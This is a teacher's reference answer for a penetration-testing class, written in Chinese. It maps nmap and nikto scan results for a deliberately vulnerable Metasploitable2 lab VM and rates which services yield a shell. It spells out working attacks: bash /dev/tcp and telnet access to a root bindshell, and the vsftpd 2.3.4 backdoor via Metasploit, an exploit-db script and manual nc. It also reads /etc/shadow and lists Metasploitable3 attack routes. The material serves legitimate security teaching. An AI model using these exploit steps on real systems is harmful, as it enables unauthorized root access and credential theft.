# Metasploitable2 掃描結果（完整埠 + 分級）

> **定位**：第二堂（nmap 偵察 Meta2）的**教師參考答案地圖**。本堂學員用 Kali 預裝的 nmap + nikto（不裝 Nessus）掃 Metasploitable2，就能做到「掃→具名 CVE→標 Exploitable」的真正弱點掃描等級，對應講義 L7 弱點識別。搭配同資料夾的 `handout.md`（學員跟課教材）與 `assignment.md`（學員作業題目）。

- **靶機 (target):** 10.99.69.9 — Metasploitable2（Apache/2.2.8、PHP/5.2.4、Ubuntu 8.04）
- **掃描機 (scanner):** 10.99.69.11 — CDX Kali（預裝工具,未另裝 Nessus）
- **日期:** 2026-10-29
- **工具:** nmap 7.94SVN、nikto 2.5.0（皆 Kali 預裝）
- **流程（正規兩階段）:**
  1. 全埠找開放埠:`nmap -p- 10.99.69.9`
  2. 對完整清單驗漏洞:`nmap -sV --script vuln -p<開放埠> -T4 10.99.69.9`
  3. web 另掃:`nikto -h http://10.99.69.9`

---

## ★ 分級:哪幾條真的要命（這才是重點）

掃出一大堆,價值在把它濃縮成「能拿 shell 的」vs「雜訊」。

### A 級 — 直接拿到 shell / RCE（先看、先修這些）

| 埠 | 服務 | 利用方式 | 拿到什麼 | 來源 |
|---|---|---|---|---|
| **1524** | `Metasploitable root shell` | `nc 10.99.69.9 1524`,**連 exploit 都不用** | **直接 root** | `-sV` 版本辨識(注意:`--script vuln` 沒標這條) |
| **21** | vsftpd 2.3.4 後門 **CVE-2011-2523** | 帳號帶 `:)` 觸發後門埠 | **root**（腳本實跑 id=`uid=0(root)`） | 專屬腳本確認 Exploitable |
| **3632** | distccd **CVE-2004-2687** | distcc 編譯任務夾命令 | daemon（腳本實跑 id=`uid=1(daemon)`,再本地提權） | 專屬腳本確認 Exploitable |
| **1099** | java-rmi 預設設定 RCE | 從遠端 URL 載入類別 | 任意碼執行 | 專屬腳本確認 VULNERABLE |
| **8787** | Ruby DRb RMI (Ruby 1.8) | Metasploit `drb_remote_codeexec` | 任意碼執行 | 版本即 RCE（腳本未自動確認） |
| **445** | Samba 3.x usermap_script **CVE-2007-2447** | username map 命令注入 | root | 版本推斷（腳本未自動確認） |
| **6667 / 6697** | UnrealIRCd 後門 **CVE-2010-2075** | 連線送觸發字串 | 任意碼執行 | 版本推斷（腳本未自動確認） |

> 教學重點:**最省力的 root 路徑 1524,`--script vuln` 漏掉了,是 `-sV` 的版本 banner(“Metasploitable root shell”）抓到的。** 掃描器給線索,判讀靠人——一堆人只看漏洞腳本的 VULNERABLE,反而會錯過最好打的那條。

**實證（1524 直接拿 root,不需 exploit、不需 nc）**

連 1524 不是攻擊指令,只是開一條 TCP 連線——那個埠上已有一個以 root 執行的 shell 在聽。任何能開 TCP 的工具都行:

```bash
# 方法 A:bash 內建 /dev/tcp(完全不裝工具)
exec 3<>/dev/tcp/10.99.69.9/1524
printf 'id; whoami; uname -a; exit\n' >&3
cat <&3

# 方法 B:telnet(最通用)
telnet 10.99.69.9 1524
# 連上後直接打 id、whoami …
```

實跑輸出:

```
root@metasploitable:/# uid=0(root) gid=0(root) groups=0(root)
root
metasploitable
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
```

一連上,提示字元就是 `root@metasploitable:/#`——對面直接把 root shell 塞過來,`id` 回 `uid=0(root)`。連上後打的都是**一般指令**,只是在對面以 root 身分執行。`nc` 可換成 `telnet` / `socat` / `/dev/tcp`,工具不重要;會不會從 `-sV` 的 banner 看出「這埠是 root shell」才是重點。

### B 級 — 弱認證 / 存取（能進去或橫向移動）

- **512 / 513 / 514** — r 系列服務(rexec / rlogin / rsh),弱信任、明文。
- **5900** — VNC(protocol 3.3),常弱密碼。
- **2049** — NFS,常有可掛載的匯出(no_root_squash)。
- **6000** — X11（access denied,但常可開,能側錄鍵盤/截圖）。
- **23** — telnet,明文帳密。
- **8009** — AJP13(Tomcat),Ghostcat **CVE-2020-1938** 面。

### C 級 — 真的有、但不致命（寫報告列一下,不會從這下手）

- **25 / 5432 TLS 弱點**:POODLE(CVE-2014-3566)、Logjam(CVE-2015-4000)、CCS Injection(CVE-2014-0224)、匿名/弱 DH——都是 MitM 類,要先有中間人位置,危害低。
- **53** ISC BIND 9.4.2、**2121** ProFTPD 1.3.1、**3306** MySQL 5.0.51a——舊版本,但本次沒驗到可直接打穿的洞。

---

## ★ 入侵面四分類（能拿 shell 的獨立路徑清單）

同一台靶機能示範四種完全不同性質的入侵面。總計十幾到二十條可拿 shell 的路（web app 逐條算更多）。標註:**腳本實證** = 本次 nmap 專屬腳本確認;版本推斷 = banner 版本比對;標準已知 = Meta2 公認可打但本次未自動驗。

### 一、免 exploit 後門（連上/觸發就進，跟 1524 同性質）
| # | 埠 | 方式 | 拿到 | 狀態 |
|---|---|---|---|---|
| 1 | 1524 | ingreslock root bindshell（已示範） | root | -sV banner |
| 2 | 21 | vsftpd 2.3.4 笑臉後門 CVE-2011-2523 | root | 腳本實證 |
| 3 | 6667/6697 | UnrealIRCd 後門 CVE-2010-2075 | RCE | 版本推斷 |
| 4 | 3632 | distcc CVE-2004-2687 | daemon→再提權 | 腳本實證 |

### 二、服務型 RCE / 誤設
| # | 埠 | 方式 | 拿到 | 狀態 |
|---|---|---|---|---|
| 5 | 445 | Samba usermap_script CVE-2007-2447 | root | 版本推斷 |
| 6 | 1099 | java-rmi 預設設定載入類別 | RCE | 腳本 VULNERABLE |
| 7 | 8787 | Ruby DRb (Ruby 1.8) | RCE | 版本推斷 |
| 8 | 8180 | Tomcat 弱密碼 → 部署惡意 WAR | RCE | 標準已知 |
| 9 | 5432 | PostgreSQL 弱密碼 → UDF/COPY | RCE | 標準已知 |
| 10 | 8009 | AJP Ghostcat CVE-2020-1938 | 檔案讀取→RCE | 面存在 |

### 三、弱認證直接登入（爛密碼，非漏洞）
| # | 埠 | 方式 |
|---|---|---|
| 11 | 22 | SSH `msfadmin/msfadmin` |
| 12 | 23 | telnet 明文弱密碼 |
| 13 | 5900 | VNC 弱密碼 |
| 14 | 512-514 | r-services 信任關係 |
| 15 | 3306 | MySQL 空/弱 root |
| 16 | 2049 | NFS no_root_squash → 寫入 SSH 金鑰 |

### 四、Web 應用層（皆掛在 80 埠）
| # | 應用 | 方式 |
|---|---|---|
| 17 | DVWA | command injection / 檔案上傳 / SQLi |
| 18 | Mutillidae | OWASP 類一票 |
| 19 | phpMyAdmin | DB 控制 → 寫檔 |
| 20 | TWiki | history RCE |

> 最省力前段班:**1524、vsftpd 21、UnrealIRCd 6667**——基本連上就有 root/RCE,不需會寫 exploit。四分類對照「哪種最好防、哪種最該先修」很適合教學。

---

## 一、完整開放服務（24 個埠,nmap -sV）

| 埠 | 服務 | 版本 |
|---|---|---|
| 21 | ftp | vsftpd 2.3.4 |
| 22 | ssh | OpenSSH 4.7p1 Debian 8ubuntu1 |
| 23 | telnet | Linux telnetd |
| 25 | smtp | Postfix smtpd |
| 53 | domain | ISC BIND 9.4.2 |
| 111 | rpcbind | RPC #100000 |
| 139 / 445 | netbios-ssn | Samba smbd 3.X–4.X (WORKGROUP) |
| 512 | exec | netkit-rsh rexecd |
| 513 | login | rlogin |
| 514 | shell | rsh (tcpwrapped) |
| 1099 | java-rmi | GNU Classpath grmiregistry |
| 1524 | bindshell | **Metasploitable root shell** |
| 2049 | nfs | RPC #100003 (v2-4) |
| 2121 | ftp | ProFTPD 1.3.1 |
| 3306 | mysql | MySQL 5.0.51a-3ubuntu5 |
| 3632 | distccd | distccd v1 (GNU 4.2.4) |
| 5432 | postgresql | PostgreSQL 8.3.0–8.3.7 |
| 5900 | vnc | VNC (protocol 3.3) |
| 6000 | X11 | (access denied) |
| 6667 / 6697 | irc | UnrealIRCd |
| 8009 | ajp13 | Apache Jserv (Protocol v1.3) |
| 8180 | http | Apache Tomcat/Coyote JSP 1.1 |
| 8787 | drb | Ruby DRb RMI (Ruby 1.8) |

---

## 二、nmap 專屬腳本確認的 VULNERABLE（原樣）

- **21 vsftpd**:`ftp-vsftpd-backdoor` → CVE-2011-2523,State VULNERABLE (Exploitable),id=`uid=0(root)`
- **25 Postfix TLS**:匿名 DH、Logjam(CVE-2015-4000)、弱 DH、POODLE(CVE-2014-3566)
- **1099 java-rmi**:`rmi-vuln-classloader` → RMI 預設設定 RCE,VULNERABLE
- **3632 distccd**:`distcc-cve2004-2687` → CVE-2004-2687,State VULNERABLE (Exploitable),id=`uid=1(daemon)`
- **5432 PostgreSQL TLS**:POODLE、弱 DH、CCS Injection(CVE-2014-0224)

---

## 三、nikto web 掃描（80 埠,27 條）

phpinfo.php 外露、phpMyAdmin 多檔可讀、`/doc/` 可瀏覽(CVE-1999-0678)、`/test/`、`/icons/` 目錄列表、PHP easter-egg 資訊洩漏(OSVDB-12184)、mod_negotiation MultiViews、缺 X-Frame-Options / X-Content-Type-Options、TRACE(XST)、`#wp-config.php#` 探測。

---

## 四、對課程的意義

- 預裝的 nmap + nikto 放對靶機(Metasploitable2),能到「掃→具名→標 Exploitable」的真正弱點掃描等級,**不需安裝 Nessus**,對得上「掃另一台 VM、觀察結果」的要求。
- 但更值得教的是「掃描 ≠ 結束」:整條鏈是 **掃描(找攻擊面)→ 判讀分級(哪幾條要命)→ 選一條打穿(或防守方修補)→ 偵測/驗證**。
- 1524 的例子最好用:**漏洞腳本漏掉的那條,反而是最好打的 root**——說明「看懂輸出」比「跑完工具」重要。

---

## 五、打穿流程參考（教師用：三種打法 + 排錯）

對應作業第三部分。**學員只需走通一條**;這裡列全三種打法與常見排錯,供課堂走查與答疑。以 vsftpd 2.3.4(21 埠)為例。

**順序**:nmap(VULNERABLE + 版本)→ searchsploit(查武器)→ 才決定怎麼打。指令都從 `nmap References → searchsploit(-m/-x)/ msf search → 讀 exploit` 推出來,不是背的。

```text
searchsploit vsftpd 2.3.4
  ├─ 有 Metasploit 模組(.rb) → 打法一 metasploit（最省事）
  ├─ msf 慢/當            → 打法二 獨立腳本(.py)
  └─ 想純手工 / 保底       → 打法三 純 nc
```

### 打法一 — metasploit

模組名來自 nmap References(`.../exploits/unix/ftp/vsftpd_234_backdoor.rb`)或 `searchsploit`:

```text
msfconsole -q
use exploit/unix/ftp/vsftpd_234_backdoor
info                      # 告訴你要設 RHOSTS
set RHOSTS <靶機IP>
exploit                   # → 無提示字元的 shell;打 id → uid=0(root)
```

### 打法二 — 獨立腳本（.py，msf 卡住時最快）

```bash
searchsploit -m unix/remote/49757.py   # 複製到當前目錄
cat 49757.py                           # argparse 顯示只吃一個參數＝靶機IP
python3 49757.py <靶機IP>              # → Success, shell opened,進 root shell
```

### 打法三 — 純 nc（不需任何工具，最看得懂機制）

機制:`USER` 結尾加 `:)` 觸發後門,後門在 **6200** 開 root shell。

```bash
# 終端1:觸發
nc <靶機IP> 21
USER x:)
PASS x
# 終端2:後門在 6200
nc <靶機IP> 6200
id        # uid=0(root)
```

### 進去之後（④，已是 root）

```bash
id ; whoami
cat /etc/shadow      # 只有 root 讀得到,證明權限
ls -la /root
```

### 常見排錯（學員最容易卡的地方）

- **msf 啟動很慢、像當機**:正常,載模組要時間;`msfconsole -q` 省掉 banner。真的卡死見下。
- **msf 報 `Errno::ELOOP` / `Too many levels of symbolic links`**(bootsnap 掃到 `/usr/lib/llvm-16/...` 的遞迴 symlink):
  - **可靠解(本批 VM 實測有效)**:刪掉那個遞迴目錄 → `sudo rm -rf /usr/lib/llvm-16/build`;要外科一點就只刪循環連結 → `find /usr/lib/llvm-16/build -xtype l -delete`。刪完再開 msf。
  - `DISABLE_BOOTSNAP=1 msfconsole` 在這個 msf build **實測無效**,別依賴它。
  - 治本:`env | grep -i ruby`——若 `RUBYLIB`/`RUBYOPT` 把 `/usr` 塞進載入路徑,清掉才是源頭(刪 symlink 是治標)。
  - 同一鏡像 clone 出來的多台 VM 會一起壞——這不是 Kali 本身的問題。
- **`.py` 報 `No module named 'telnetlib'`**:Python 3.13 移除了 telnetlib → 改走打法三純 nc(效果相同)。若堅持用腳本:`pip install telnetlib3`(補回被移除的模組)或改用 Python 3.12 跑,腳本都不用動。
- **`.py` 印了 `Success, shell opened` 卻打 `id` 沒回傳**:不是後門沒開,是腳本那層 telnetlib `interact()` 收發不靈(裝套件救不了,那是行為問題)→ 改走打法三純 nc(連的是同一個 6200 後門)。
- **`nmap --script vuln` 對 21 vsftpd 後門突然驗不出來 / 港 21 下一片空白**:
  - `vuln` 類腳本**預設只印 VULNERABLE**,驗不過就安靜;加 `-v` 才看得到「not vulnerable / 腳本有沒有真的跑」。
  - 沒 `-sV` 時 `ftp` 只是照埠號猜的,不知真實版本;先 `nmap -sV -p21` 確認這台還是不是 `vsftpd 2.3.4`。
  - **最常見真因:後門被前面打髒。** `ftp-vsftpd-backdoor` 是**當場觸發**(送 `:)` → 連 6200 驗),前面已用腳本/nc 反覆打過,6200 殘留或被佔 → 這次觸發失敗 → 判 not vulnerable → 空白。**靶機重啟 vsftpd 或還原快照即可復原**(本批 VM 實測:重置後又驗得到)。

> 三條打法結果都一樣(root),差別只在「誰幫你做那套 `:)` + 6200」。課堂上 msf 開不起來是常態,直接走打法二或三,別讓學員卡在工具上。

---

## 六、教學定位（對應講義・堂次關係）

- **對應講義**：nmap 弱點識別段（L7）。**場次**：2026-10 於 CDX。
- 第一堂（`../01_attack-cve-2021-41773`）是「給好漏洞、帶著打一條」；本堂要學員自己掃、自己判讀、自己挑一條做。
- 弱掃不一定要 Nessus：本堂證明 Kali 預裝的 nmap 放對靶機就能到真正弱掃等級。Nessus 路線見備選教材 `../../CDX_alt-materials/nessus-suricata`。

---

## 七、Meta3 加分題批改參考（教師用）

加分題在 Windows 的 **Metasploitable3**，服務和 Meta2 很不一樣、普遍較進階。這是**課外加分**，批改重點只有：**有沒有在 Meta3 上真的拿到一個 shell、說得出怎麼拿的**——不限走哪條路、不要求提權。

學生最可能回報的幾條好上手路（`nmap -sV` 可辨識，多半有現成 msf 模組；**埠號依各人 VM 的 build 可能略有不同**，以實掃為準）：

| 服務 | 常見埠 | 常見打法 | 拿到 |
|---|---|---|---|
| Apache Tomcat | 8282 | manager 弱密碼 → 部署惡意 WAR | RCE |
| Jenkins | 8484 | Script Console（Groovy）執行指令 | RCE |
| GlassFish | 4848 / 8080 | 預設／弱密碼 → 部署 WAR | RCE |
| Elasticsearch | 9200 | CVE-2014-3120／CVE-2015-1427 腳本注入 | RCE |
| WebDAV／PHP | 8585 | 上傳 webshell | RCE |
| SMB | 445 | 弱密碼或已知 Windows 服務漏洞 | shell |

- 流程和 Meta2 一樣：`nmap -p-` 找埠 → `-sV` 認版本 → `searchsploit` / msf `search` 查模組 → 利用。
- **身分證明在 Windows 用 `whoami`（沒有 `id`）**，常見會是 `nt authority\system` 或某服務帳號；截圖看得到「掃到服務 → 用的指令 → 拿到 shell 後的 `whoami`」即可給分。
